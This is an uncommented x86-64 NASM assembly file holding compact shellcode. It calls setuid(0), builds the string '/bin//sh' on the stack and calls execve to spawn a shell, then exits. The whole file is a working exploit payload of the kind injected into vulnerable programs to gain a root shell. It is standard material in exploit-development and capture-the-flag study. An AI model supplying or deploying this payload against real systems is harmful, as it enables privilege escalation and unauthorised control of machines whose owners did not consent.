        BITS 64
        global _start
        section .text
 
_start:
	xor	rdx,rdx
        mov     rdi,rdx
        mov     al, 0x69
        syscall
 
        mov     rbx, 0x68732f2f6e69622f
	push	rdx
        push    rbx
        push    rsp
        pop     rdi
        push    rdx
        push    rdi
        push    rsp
        pop     rsi
        mov     eax, edx
        add     al, 0x3b
        syscall
 
        push    0x1
        pop     rdi
        push    0x3c
        pop     rax
        syscall


